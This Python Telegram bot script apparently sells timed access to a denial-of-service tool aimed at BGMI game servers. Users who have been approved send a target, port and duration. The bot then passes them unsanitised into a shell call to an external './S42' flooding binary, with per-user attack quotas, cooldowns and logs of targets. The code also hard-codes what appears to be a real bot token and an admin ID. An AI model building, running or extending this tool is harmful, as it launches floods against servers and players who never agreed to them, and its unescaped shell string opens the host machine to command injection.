import telebot
import subprocess
import datetime
import os
import time
import threading


bot = telebot.TeleBot('7630306892:AAFvSmee3PYScSmn4Ntmm_Uob0xmyk34hjo')
admin_id = ["6769245930"]
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
user_approval_expiry = {}
user_attack_count = {}
last_attack_time = {}

# Max daily attacks
max_daily_attacks = 20
COOLDOWN_TIME = 20 # Cooldown period in seconds

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.total_seconds() < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit in ["hour", "hours"]:
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ["day", "days"]:
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ["week", "weeks"]:
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ["month", "months"]:
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False
    user_approval_expiry[user_id] = expiry_date
    return True

def can_attack(user_id):
    """Check if the user can initiate an attack (based on cooldown)."""
    current_time = datetime.datetime.now()
    
    if user_id in last_attack_time:
        last_time = last_attack_time[user_id]
        time_diff = (current_time - last_time).total_seconds()
        
        if time_diff < COOLDOWN_TIME:
            remaining_time = COOLDOWN_TIME - time_diff
            return False, remaining_time
    return True, 0

def reset_attack_count():
    current_time = datetime.datetime.now()
    next_reset_time = current_time.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
    time_to_wait = (next_reset_time - current_time).total_seconds()
    time.sleep(time_to_wait)
    user_attack_count.clear()

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:  # user_id, duration_str, time_unit
            user_to_add = command[1]
            duration_str = command[2]
            try:
                duration = int(duration_str[:-4])  
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = "𝗛𝗘𝗬 𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥👋 \n\n𝘂𝘀𝗲𝗿 --> 5857557446 \n𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ❤️ \n\n𝗡𝗢𝗪 𝗔𝗗𝗗 𝗠𝗢𝗗𝗘"
                else:
                    response = "Error setting expiry date."
            else:
                response = "𝘼𝙇𝙍𝙀𝘼𝘿𝙔 𝙅𝙊𝙄𝙉𝙀𝘿 🔥"
        else:
            response = "𝗔𝗹𝗿𝗲𝗮𝗱𝘆❌ 𝗲𝘅𝗶𝘀𝘁 𝗮𝗻𝗱 𝘂𝘀𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗯𝗼𝘁"
    else:
        response = "ＥＲＲＯＲ"
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅."
            else:
                response = "𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐧𝐨𝐭 𝐞𝐱𝐢𝐬𝐭𝐢𝐧𝐠 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐛𝐨𝐭"
        else:
            response = "𝗘𝗿𝗿𝗼𝗿 :- 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 --> /𝗿emove <𝘂𝘀𝗲𝗿_𝗶𝗱>."
    else:
        response = "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ."
    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"𝆺𝅥⃝Oғͥғɪᴄͣɪͫ͢͢͢ᴀℓ —͟͞͞Ꮅ𝙧ɇ𝙢īū𝙢—͟͞͞\n🔗 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 🔗\n\n▁ ▂ ▄ ▅ ▆ ▇ █\nA̶t̶t̶a̶c̶k̶ ̶B̶y̶ ̶:̶-̶ {username} \n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"
    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        reset_attack_count_thread = threading.Thread(target=reset_attack_count)
        reset_attack_count_thread.daemon = True
        reset_attack_count_thread.start()

        if user_id not in admin_id:
            # Check if the user is allowed to attack based on cooldown
            can_attack_now, remaining_time = can_attack(user_id)
            
            if not can_attack_now:
                response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙞𝙨 𝙨𝙩𝙞𝙡𝙡 𝙧𝙪𝙣𝙣𝙞𝙣𝙜... {int(remaining_time)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙧𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 "
            else:
                # Check how many attacks the user has performed today and calculate remaining attacks
                attacks_today = user_attack_count.get(user_id, 0)
                remaining_attacks = max_daily_attacks - attacks_today

                if remaining_attacks <= 0:
                    response = f"𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝙍𝙚𝙖𝙘𝙝𝙚𝙙 𝙏𝙝𝙚 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 𝙉𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝘼𝙩𝙩𝙖𝙘𝙠𝙨 ({max_daily_attacks}) \n𝐏𝐋𝐄𝐀𝐒𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖 && 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 𝐓𝐎 𝐑𝐄𝐒𝐄𝐓 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝘾𝙍𝙀𝘿𝙄𝙏𝙎 "
                else:
                    command = message.text.split()
                    if len(command) == 4:
                        target = command[1]
                        port = int(command[2])
                        time = int(command[3])

                        if time > 200:
                            response = "𝐓𝐘𝐏𝐄 𝐒𝐄𝐂𝐎𝐍𝐃 --> 200"
                        else:
                            user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
                            record_command_logs(user_id, '/bgmi', target, port, time)
                            log_command(user_id, target, port, time)
                            start_attack_reply(message, target, port, time)

                            full_command = f"./S42 {target} {port} {time} 1000"
                            subprocess.run(full_command, shell=True)

                            # Update the last attack time for this user
                            last_attack_time[user_id] = datetime.datetime.now()

                            response = f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 --> 𝙁𝙄𝙉𝙄𝙎𝙃 😅\n𝐓𝐚𝐫𝐠𝐞𝐭 {target} 𝐏𝐨𝐫𝐭 {port} 𝐓𝐢𝐦𝐞 {time}\n\n𝙏𝙊𝙏𝘼𝙇 𝘾𝙍𝙀𝘿𝙄𝙏𝙎 --> 5/{remaining_attacks-1}"
                    else:
                        response = "𝙽𝙾𝚆 𝙱𝙾𝚃 𝚂𝚃𝙰𝚃𝚄𝚂 --> 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴✅ \n𝚈𝙾𝚄 𝙲𝙰𝙽 𝚄𝚂𝙴 𝚃𝙷𝙸𝚂 𝙱𝙾𝚃 𝙻𝙸𝙺𝙴 --> \n/𝚋𝚐𝚖𝚒 <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚘𝚛𝚝> <𝚝𝚒𝚖𝚎>"
        else:
            response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐬𝐞𝐝 𝐛𝐲 𝐚𝐝𝐦𝐢𝐧 𝐩𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐮𝐬"
    else:
        response = "🚫 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭.."

    bot.reply_to(message, response)

@bot.message_handler(commands=['reset'])
def handle_reset(message):
    user_id = str(message.chat.id)

    # Check if the user is an admin
    if user_id in admin_id:
        # Extract the target user ID from the command
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            
            # Reset the attack count for the specified user
            if target_user_id in user_attack_count:
                user_attack_count[target_user_id] = 0
                response = f"𝙐𝙎𝙀𝙍 {target_user_id} 𝘾𝙍𝙀𝘿𝙄𝙏𝙎 𝙍𝙀𝙎𝙀𝙏 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔"
            else:
                response = f"𝐋𝐈𝐅𝐄 𝐋𝐈𝐍𝐄 𝐀𝐋𝐈𝐕𝐄 😎 {target_user_id}."
        else:
            response = "𝚃𝚛𝚢 𝙰𝚐𝚊𝚒𝚗 - /𝚛𝚎𝚜𝚎𝚝 <𝚞𝚜𝚎𝚛_𝚒𝚍>"
    else:
        response = "𝐘𝐨𝐮 𝐃𝐨 𝐍𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧🚫 𝐓𝐨 𝐑𝐞𝐬𝐞𝐭 𝐓𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐂𝐫𝐞𝐝𝐢𝐭𝐬"

    bot.reply_to(message, response)
    
    
@bot.message_handler(commands=['check'])
def check_cooldown(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        can_attack_now, remaining_time = can_attack(user_id)
        attacks_today = user_attack_count.get(user_id, 0)
        remaining_attacks = max_daily_attacks - attacks_today
        
        if not can_attack_now:
            response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙞𝙨 𝙨𝙩𝙞𝙡𝙡 𝙧𝙪𝙣𝙣𝙞𝙣𝙜... {int(remaining_time)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙧𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜"
        else:
            if remaining_attacks > 0:
                response = f"𝐍𝐎 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐅𝐎𝐔𝐍𝐃✅ \n𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒 --> ✅✅"
            else:
                response = "𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝙍𝙚𝙖𝙘𝙝𝙚𝙙 𝙏𝙝𝙚 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 ❌𝘾𝙍𝙀𝘿𝙄𝙏𝙎❌ 𝙤𝙛 𝘼𝙩𝙩𝙖𝙘𝙠𝙨 ({max_daily_attacks}) \n𝐏𝐋𝐄𝐀𝐒𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖 && 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 𝐓𝐎 𝐑𝐄𝐒𝐄𝐓 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝘾𝙍𝙀𝘿𝙄𝙏𝙎\n\n𝐘𝐎𝐔𝐑 𝐓𝐎𝐓𝐀𝐋 𝐂𝐑𝐃𝐓𝐬 --> 5/0"
    else:
        response = "🚫 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭."

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['remove_cooldown'])
def remove_cooldown(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_reset = command[1]
            if user_to_reset in allowed_user_ids:
                if user_to_reset in last_attack_time:
                    del last_attack_time[user_to_reset]
                bot.reply_to(message, f"𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐑𝐄𝐌𝐎𝐕𝐄 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ✅ {user_to_reset}.")
            else:
                bot.reply_to(message, "YOU NEED FIRST ADD USER BEFORE REMOVE USER COOLDOWN 🚫")
        else:
            bot.reply_to(message, "E̷r̷r̷o̷r̷")
    else:
        bot.reply_to(message, "𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐔𝐬𝐞 𝐎𝐧𝐥𝐲 - @S4_OFFICIAL_0")
        
@bot.message_handler(commands=['reset_all'])
def reset_all_cooldowns(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        last_attack_time.clear()  # Clear all cooldowns
        bot.reply_to(message, "𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐑𝐞𝐒𝐞𝐭 𝐁𝐲 𝐒𝟒 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋✅")
    else:
        bot.reply_to(message, "𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐔𝐬𝐞 𝐎𝐧𝐥𝐲 - @S4_OFFICIAL_0")
 
    
@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = '''🙏 🇳 🇦 🇲 🇦 🇸 🇹 🇪 🙏'''
    bot.reply_to(message, response)

# Start the bot
bot.polling(none_stop=True)
